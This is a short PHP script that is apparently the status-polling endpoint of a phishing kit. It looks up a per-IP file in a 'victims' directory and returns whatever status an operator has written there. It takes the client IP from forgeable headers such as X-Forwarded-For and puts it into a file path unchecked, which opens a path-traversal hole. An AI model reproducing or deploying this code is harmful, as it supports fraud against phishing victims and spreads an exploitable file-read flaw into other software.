<?php
header('Content-Type: application/json');

function get_client_ip() {
  $keys = ['HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR'];
  foreach ($keys as $key) {
    $ip = getenv($key);
    if ($ip) return $ip === '::1' ? '127.0.0.1' : $ip;
  }
  return 'UNKNOWN';
}

$ip = get_client_ip();
$file = "victims/{$ip}.php";

if (!file_exists($file)) {
  echo json_encode(['status' => 'pending']); // مزال مكاين والو
  exit;
}

$data = trim(file_get_contents($file));
echo json_encode(['status' => $data]);